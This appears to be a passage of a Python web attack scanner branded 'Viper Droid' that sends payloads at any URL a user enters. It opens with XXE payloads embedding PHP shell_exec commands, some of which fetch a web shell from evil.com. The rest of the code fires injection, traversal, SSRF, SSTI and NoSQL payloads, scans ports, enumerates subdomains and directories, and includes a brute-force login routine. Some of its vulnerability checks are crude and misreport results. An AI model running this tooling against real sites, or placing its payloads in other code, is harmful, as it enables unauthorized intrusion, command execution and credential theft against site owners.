    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'ps aux\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'netstat -an\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'ifconfig\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'curl http://evil.com\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'wget http://evil.com/shell.php\'); ?>"> ]><foo>&xxe;</foo>',
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}
# Logging
LOG_FILE = "scan_log.txt"

def print_banner():
    print(Fore.GREEN + """
     ██╗   ██╗██╗██████╗ ███████╗███████╗██████╗ 
     ██║   ██║██║██╔══██╗██╔════╝██╔════╝██╔══██╗
     ██║   ██║██║██████╔╝█████╗  █████╗  ██████╔╝
     ██║   ██║██║██╔═══╝ ██╔══╝  ██╔══╝  ██╔══██╗
     ╚██████╔╝██║██║     ███████╗███████╗██║  ██║
      ╚═════╝ ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝

    """)
    print(Fore.CYAN + "Powered by " + Fore.RED + "Viper Droid" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 60 + Style.RESET_ALL)

def log_message(message):
    with open(LOG_FILE, "a") as log_file:
        log_file.write(message + "\n")

def get_ip_address(url):
    try:
       
        parsed_url = urlparse(url)
        domain = parsed_url.netloc or parsed_url.path.split('/')[0]
        
        # Remove 'www.' if present
        domain = domain.replace("www.", "")
        
        # Get IP addresses (both IPv4 and IPv6)
        addr_info = socket.getaddrinfo(domain, None)
        
        # Extract IPv4 and IPv6 addresses
        ipv4_addresses = [info[4][0] for info in addr_info if info[0] == socket.AF_INET]
        ipv6_addresses = [info[4][0] for info in addr_info if info[0] == socket.AF_INET6]
        
       
        if ipv4_addresses:
            print(Fore.CYAN + f"[*] IPv4 Address(es) of {url}: {', '.join(ipv4_addresses)}" + Style.RESET_ALL)
            log_message(f"[*] IPv4 Address(es) of {url}: {', '.join(ipv4_addresses)}")
        if ipv6_addresses:
            print(Fore.CYAN + f"[*] IPv6 Address(es) of {url}: {', '.join(ipv6_addresses)}" + Style.RESET_ALL)
            log_message(f"[*] IPv6 Address(es) of {url}: {', '.join(ipv6_addresses)}")
        
        # Return the first IPv4 address if available, otherwise the first IPv6 address
        return ipv4_addresses[0] if ipv4_addresses else ipv6_addresses[0] if ipv6_addresses else None
    
    except socket.gaierror as e:
        print(Fore.RED + f"[❌] Error retrieving IP address: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error retrieving IP address: {e}")
        return None
    except Exception as e:
        print(Fore.RED + f"[❌] Unexpected error: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Unexpected error: {e}")
        return None

def scan_ports(ip, ports, timeout=1, max_threads=100):
    print(Fore.CYAN + f"[*] Scanning ports on {ip}..." + Style.RESET_ALL)
    log_message(f"[*] Scanning ports on {ip}...")

    open_ports = []
    closed_ports = []
    lock = threading.Lock()

    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            if result == 0:
                try:
                    # Attempt to grab banner/service information
                    banner = sock.recv(1024).decode().strip()
                    with lock:
                        open_ports.append((port, banner))
                        print(Fore.GREEN + f"[✅] Port {port} is open | Service: {banner}" + Style.RESET_ALL)
                        log_message(f"[✅] Port {port} is open | Service: {banner}")
                except:
                    with lock:
                        open_ports.append((port, "Unknown"))
                        print(Fore.GREEN + f"[✅] Port {port} is open | Service: Unknown" + Style.RESET_ALL)
                        log_message(f"[✅] Port {port} is open | Service: Unknown")
            else:
                with lock:
                    closed_ports.append(port)
                    print(Fore.RED + f"[❌] Port {port} is closed" + Style.RESET_ALL)
                    log_message(f"[❌] Port {port} is closed")
            sock.close()
        except Exception as e:
            with lock:
                print(Fore.YELLOW + f"[⚠️] Error scanning port {port}: {e}" + Style.RESET_ALL)
                log_message(f"[⚠️] Error scanning port {port}: {e}")

    # Create and start threads for scanning
    threads = []
    for port in ports:
        while threading.active_count() >= max_threads:
            pass  # Wait if too many threads are active
        thread = threading.Thread(target=scan_port, args=(port,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Print summary of the scan
    print(Fore.CYAN + f"\n[*] Scan summary for {ip}:" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Open ports: {len(open_ports)}" + Style.RESET_ALL)
    for port, banner in open_ports:
        print(Fore.GREEN + f"[✅] Port {port} | Service: {banner}" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Closed ports: {len(closed_ports)}" + Style.RESET_ALL)
    log_message(f"[*] Scan summary for {ip}: Open ports: {len(open_ports)}, Closed ports: {len(closed_ports)}")

def test_vulnerability(url, params, payloads, vulnerability_type):
    print(Fore.CYAN + f"[*] Testing {vulnerability_type} on {url}" + Style.RESET_ALL)
    log_message(f"[*] Testing {vulnerability_type} on {url}")
    found = False
    for payload in payloads:
        test_params = {k: payload for k in params.keys()}
        try:
            response = requests.get(url, params=test_params, headers=HEADERS)
            if vulnerability_type == "SQL Injection" and ("error" in response.text.lower() or "syntax" in response.text.lower()):
                print(Fore.GREEN + f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}" + Style.RESET_ALL)
                log_message(f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}")
                found = True
            elif vulnerability_type == "XSS" and payload in response.text:
                print(Fore.GREEN + f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}" + Style.RESET_ALL)
                log_message(f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}")
                found = True
            elif vulnerability_type == "Command Injection" and ("root:" in response.text or "localhost" in response.text):
                print(Fore.GREEN + f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}" + Style.RESET_ALL)
                log_message(f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}")
                found = True
            elif vulnerability_type == "Path Traversal" and ("root:" in response.text or "Windows" in response.text):
                print(Fore.GREEN + f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}" + Style.RESET_ALL)
                log_message(f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}")
                found = True
            elif vulnerability_type == "File Inclusion" and ("root:" in response.text or "<?php" in response.text):
                print(Fore.GREEN + f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}" + Style.RESET_ALL)
                log_message(f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}")
                found = True
            elif vulnerability_type == "SSRF" and ("Amazon" in response.text or "localhost" in response.text):
                print(Fore.GREEN + f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}" + Style.RESET_ALL)
                log_message(f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}")
                found = True
            elif vulnerability_type == "XXE" and ("root:" in response.text or "Amazon" in response.text):
                print(Fore.GREEN + f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}" + Style.RESET_ALL)
                log_message(f"[✅] Success! {vulnerability_type} vulnerability found with payload: {payload}")
                found = True
        except requests.RequestException as e:
            print(Fore.RED + f"[❌] Error testing {vulnerability_type}: {e}" + Style.RESET_ALL)
            log_message(f"[❌] Error testing {vulnerability_type}: {e}")
    if not found:
        print(Fore.RED + f"[❌] No {vulnerability_type} vulnerabilities found." + Style.RESET_ALL)
        log_message(f"[❌] No {vulnerability_type} vulnerabilities found.")

def check_csrf(url):
    print(Fore.CYAN + f"[*] Checking for CSRF vulnerabilities on {url}" + Style.RESET_ALL)
    log_message(f"[*] Checking for CSRF vulnerabilities on {url}")
    try:
        response = requests.get(url, headers=HEADERS)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            print(Fore.RED + "[❌] No forms found on the page." + Style.RESET_ALL)
            log_message("[❌] No forms found on the page.")
            return
        for form in forms:
            if not form.find("input", {"name": "csrf_token"}):
                print(Fore.GREEN + f"[✅] Potential CSRF vulnerability found in form: {form}" + Style.RESET_ALL)
                log_message(f"[✅] Potential CSRF vulnerability found in form: {form}")
            else:
                print(Fore.RED + "[❌] CSRF token found. No CSRF vulnerability detected." + Style.RESET_ALL)
                log_message("[❌] CSRF token found. No CSRF vulnerability detected.")
    except requests.RequestException as e:
        print(Fore.RED + f"[❌] Error checking CSRF: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error checking CSRF: {e}")

def enumerate_subdomains(domain):
    print(Fore.CYAN + f"[*] Enumerating subdomains for {domain}" + Style.RESET_ALL)
    log_message(f"[*] Enumerating subdomains for {domain}")
    subdomains = ["www", "mail", "ftp", "admin", "test", "dev", "api"]
    found_subdomains = []
    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            response = requests.get(url, headers=HEADERS, timeout=3)
            if response.status_code == 200:
                print(Fore.GREEN + f"[✅] Found subdomain: {url}" + Style.RESET_ALL)
                log_message(f"[✅] Found subdomain: {url}")
                found_subdomains.append(url)
        except requests.RequestException:
            continue
    if not found_subdomains:
        print(Fore.RED + "[❌] No subdomains found." + Style.RESET_ALL)
        log_message("[❌] No subdomains found.")

def crawl_website(url):
    print(Fore.CYAN + f"[*] Crawling {url} for pages and forms..." + Style.RESET_ALL)
    log_message(f"[*] Crawling {url} for pages and forms...")
    try:
        response = requests.get(url, headers=HEADERS)
        soup = BeautifulSoup(response.text, "html.parser")
        links = soup.find_all("a", href=True)
        forms = soup.find_all("form")
        for link in links:
            full_url = urljoin(url, link["href"])
            print(Fore.GREEN + f"[✅] Found page: {full_url}" + Style.RESET_ALL)
            log_message(f"[✅] Found page: {full_url}")
        for form in forms:
            print(Fore.GREEN + f"[✅] Found form: {form}" + Style.RESET_ALL)
            log_message(f"[✅] Found form: {form}")
    except requests.RequestException as e:
        print(Fore.RED + f"[❌] Error crawling website: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error crawling website: {e}")

def discover_api_endpoints(url):
    print(Fore.CYAN + f"[*] Discovering API endpoints on {url}" + Style.RESET_ALL)
    log_message(f"[*] Discovering API endpoints on {url}")
    try:
        response = requests.get(url, headers=HEADERS)
        soup = BeautifulSoup(response.text, "html.parser")
        links = soup.find_all("a", href=True)
        api_endpoints = set()
        for link in links:
            href = link["href"]
            if "/api/" in href or "/v1/" in href or "/v2/" in href:
                full_url = urljoin(url, href)
                api_endpoints.add(full_url)
        if api_endpoints:
            for endpoint in api_endpoints:
                print(Fore.GREEN + f"[✅] Found API endpoint: {endpoint}" + Style.RESET_ALL)
                log_message(f"[✅] Found API endpoint: {endpoint}")
        else:
            print(Fore.RED + "[❌] No API endpoints found." + Style.RESET_ALL)
            log_message("[❌] No API endpoints found.")
    except requests.RequestException as e:
        print(Fore.RED + f"[❌] Error discovering API endpoints: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error discovering API endpoints: {e}")

def check_ssl_tls(url):
    print(Fore.CYAN + f"[*] Checking SSL/TLS vulnerabilities on {url}" + Style.RESET_ALL)
    log_message(f"[*] Checking SSL/TLS vulnerabilities on {url}")
    try:
        hostname = url.replace("http://", "").replace("https://", "").split("/")[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print(Fore.GREEN + f"[✅] SSL/TLS Certificate Details: {cert}" + Style.RESET_ALL)
                log_message(f"[✅] SSL/TLS Certificate Details: {cert}")
    except Exception as e:
        print(Fore.RED + f"[❌] SSL/TLS vulnerability found: {e}" + Style.RESET_ALL)
        log_message(f"[❌] SSL/TLS vulnerability found: {e}")

def enumerate_directories(url):
    print(Fore.CYAN + f"[*] Enumerating directories on {url}" + Style.RESET_ALL)
    log_message(f"[*] Enumerating directories on {url}")
    directories = ["admin", "login", "backup", "config", "api", "test", "dev"]
    found_directories = []
    for directory in directories:
        full_url = urljoin(url, directory)
        try:
            response = requests.get(full_url, headers=HEADERS, timeout=3)
            if response.status_code == 200:
                print(Fore.GREEN + f"[✅] Found directory: {full_url}" + Style.RESET_ALL)
                log_message(f"[✅] Found directory: {full_url}")
                found_directories.append(full_url)
        except requests.RequestException:
            continue
    if not found_directories:
        print(Fore.RED + "[❌] No directories found." + Style.RESET_ALL)
        log_message("[❌] No directories found.")

def check_headers(url):
    print(Fore.CYAN + f"[*] Checking HTTP headers on {url}" + Style.RESET_ALL)
    log_message(f"[*] Checking HTTP headers on {url}")
    try:
        response = requests.get(url, headers=HEADERS)
        headers = response.headers
        security_headers = ["Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options", "Strict-Transport-Security"]
        for header in security_headers:
            if header in headers:
                print(Fore.GREEN + f"[✅] Found security header: {header}" + Style.RESET_ALL)
                log_message(f"[✅] Found security header: {header}")
            else:
                print(Fore.RED + f"[❌] Missing security header: {header}" + Style.RESET_ALL)
                log_message(f"[❌] Missing security header: {header}")
    except requests.RequestException as e:
        print(Fore.RED + f"[❌] Error checking headers: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error checking headers: {e}")

def brute_force_login(url, username, wordlist):
    print(Fore.CYAN + f"[*] Brute forcing login on {url}" + Style.RESET_ALL)
    log_message(f"[*] Brute forcing login on {url}")
    try:
        with open(wordlist, "r") as f:
            passwords = f.readlines()
        for password in passwords:
            password = password.strip()
            data = {"username": username, "password": password}
            response = requests.post(url, data=data, headers=HEADERS)
            if "Login failed" not in response.text:
                print(Fore.GREEN + f"[✅] Success! Valid credentials found: {username}:{password}" + Style.RESET_ALL)
                log_message(f"[✅] Success! Valid credentials found: {username}:{password}")
                return
        print(Fore.RED + "[❌] No valid credentials found." + Style.RESET_ALL)
        log_message("[❌] No valid credentials found.")
    except Exception as e:
        print(Fore.RED + f"[❌] Error during brute force: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error during brute force: {e}")

def scan_website(url):
    print(Fore.YELLOW + f"[*] Scanning {url}" + Style.RESET_ALL)
    log_message(f"[*] Scanning {url}")

    try:
        # Step 1: Fetch the website
        response = requests.get(url, headers=HEADERS, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors

        # Step 2: Define test parameters
        params = {"username": "test", "password": "test", "file": "test", "url": "test", "xml": "test"}

        # Step 3: Test for vulnerabilities
        test_vulnerability(url, params, SQLI_PAYLOADS, "SQL Injection")
        test_vulnerability(url, params, XSS_PAYLOADS, "XSS")
        test_vulnerability(url, params, COMMAND_INJECTION_PAYLOADS, "Command Injection")
        test_vulnerability(url, params, PATH_TRAVERSAL_PAYLOADS, "Path Traversal")
        test_vulnerability(url, params, FILE_INCLUSION_PAYLOADS, "File Inclusion")
        test_vulnerability(url, params, SSRF_PAYLOADS, "SSRF")
        test_vulnerability(url, params, XXE_PAYLOADS, "XXE")

        # Step 4: Check for CSRF vulnerabilities
        check_csrf(url)

        # Step 5: Enumerate subdomains
        domain = url.replace("http://", "").replace("https://", "").split("/")[0]
        enumerate_subdomains(domain)

        # Step 6: Crawl the website for pages and forms
        crawl_website(url)

        # Step 7: Discover API endpoints
        discover_api_endpoints(url)

        # Step 8: Check SSL/TLS vulnerabilities
        check_ssl_tls(url)

        # Step 9: Enumerate directories
        enumerate_directories(url)

        # Step 10: Check HTTP headers
        check_headers(url)

        # Step 11: Brute force login
        # brute_force_login(url, "admin", "wordlist.txt")

        # Step 12: Get IP address and scan ports
        ip = get_ip_address(url)
        if ip:
            scan_ports(ip, [80, 443, 8080, 22, 21, 3306])

    except requests.RequestException as e:
        print(Fore.RED + f"[❌] Error scanning {url}: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error scanning {url}: {e}")
        return None


#new code
def test_insecure_deserialization(url):
    print(Fore.CYAN + f"[*] Testing Insecure Deserialization on {url}" + Style.RESET_ALL)
    log_message(f"[*] Testing Insecure Deserialization on {url}")
    payload = base64.b64encode(pickle.dumps({"key": "value"}))
    try:
        response = requests.post(url, data={"data": payload}, headers=HEADERS)
        if "pickle" in response.text:
            print(Fore.GREEN + f"[✅] Insecure Deserialization vulnerability found!" + Style.RESET_ALL)
            log_message(f"[✅] Insecure Deserialization vulnerability found!")
        else:
            print(Fore.RED + "[❌] No Insecure Deserialization vulnerability detected." + Style.RESET_ALL)
            log_message("[❌] No Insecure Deserialization vulnerability detected.")
    except Exception as e:
        print(Fore.RED + f"[❌] Error testing Insecure Deserialization: {e}" + Style.RESET_ALL)
        log_message(f"[❌] Error testing Insecure Deserialization: {e}")





def test_open_redirects(url):
    print(Fore.CYAN + f"[*] Testing Open Redirects on {url}" + Style.RESET_ALL)
    payloads = ["http://evil.com", "//evil.com", "/\\evil.com"]
    for payload in payloads:
        test_url = f"{url}?redirect={payload}"
        response = requests.get(test_url, headers=HEADERS, allow_redirects=False)
        if "Location" in response.headers and "evil.com" in response.headers["Location"]:
            print(Fore.GREEN + f"[✅] Open Redirect vulnerability found with payload: {payload}" + Style.RESET_ALL)
            break
    else:
        print(Fore.RED + "[❌] No Open Redirect vulnerability detected." + Style.RESET_ALL)


def test_ssti(url):
    print(Fore.CYAN + f"[*] Testing SSTI on {url}" + Style.RESET_ALL)
    payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]
    for payload in payloads:
        response = requests.post(url, data={"input": payload}, headers=HEADERS)
        if "49" in response.text:
            print(Fore.GREEN + f"[✅] SSTI vulnerability found with payload: {payload}" + Style.RESET_ALL)
            break
    else:
        print(Fore.RED + "[❌] No SSTI vulnerability detected." + Style.RESET_ALL)



def test_nosql_injection(url):
    print(Fore.CYAN + f"[*] Testing NoSQL Injection on {url}" + Style.RESET_ALL)
    payloads = ['{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}']
    for payload in payloads:
        response = requests.post(url, json={"username": payload, "password": payload}, headers=HEADERS)
        if "login" not in response.text.lower():
            print(Fore.GREEN + f"[✅] NoSQL Injection vulnerability found with payload: {payload}" + Style.RESET_ALL)
            break
    else:
        print(Fore.RED + "[❌] No NoSQL Injection vulnerability detected." + Style.RESET_ALL)






def submit_form(url, form):
    inputs = form.find_all("input")
    data = {}
    for input_tag in inputs:
        name = input_tag.get("name")
        value = input_tag.get("value", "")
        data[name] = value
    try:
        response = requests.post(url, data=data, headers=HEADERS)
        print(Fore.GREEN + f"[✅] Form submitted successfully: {url}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[❌] Error submitting form: {e}" + Style.RESET_ALL)

def render_javascript(url):
    print(Fore.CYAN + f"[*] Rendering JavaScript on {url}" + Style.RESET_ALL)
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    print(Fore.GREEN + f"[✅] Rendered page source: {driver.page_source[:100]}..." + Style.RESET_ALL)
    driver.quit()



def test_session_hijacking(url):
    print(Fore.CYAN + f"[*] Testing Session Hijacking on {url}" + Style.RESET_ALL)
    session = requests.Session()
    session.get(url, headers=HEADERS)
    cookies = session.cookies.get_dict()
    if "sessionid" in cookies:
        print(Fore.GREEN + f"[✅] Session ID found: {cookies['sessionid']}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[❌] No session ID detected." + Style.RESET_ALL)





# def test_auth_bypass(url):
#     print(Fore.CYAN + f"[*] Testing Authentication Bypass on {url}" + Style.RESET_ALL)
#     payloads = ["admin' --", "' OR '1'='1", "admin' #"]
#     for payload in payloads:
#         response = requests.post(url, data={"username": payload, "password": payload}, headers=HEADERS)
#         if "Welcome" in response.text:
#             print(Fore.GREEN + f"[✅] Authentication Bypass vulnerability found with payload: {payload}" + Style.RESET_ALL)
#             break
#     else:
#         print(Fore.RED + "[❌] No Authentication Bypass vulnerability detected." + Style.RESET_ALL)



def api_fuzzing(url):
    print(Fore.CYAN + f"[*] Fuzzing API on {url}" + Style.RESET_ALL)
    payloads = ["'", '"', "{}", "[]", "null", "NaN"]
    for payload in payloads:
        response = requests.post(url, json={"input": payload}, headers=HEADERS)
        if "error" in response.text.lower():
            print(Fore.GREEN + f"[✅] API Fuzzing vulnerability found with payload: {payload}" + Style.RESET_ALL)
            break
    else:
        print(Fore.RED + "[❌] No API Fuzzing vulnerability detected." + Style.RESET_ALL)


if __name__ == "__main__":
    print_banner()
    target_url = input(Fore.CYAN + "Enter the target website URL (e.g., http://example.com/login): " + Style.RESET_ALL)
    scan_website(target_url)

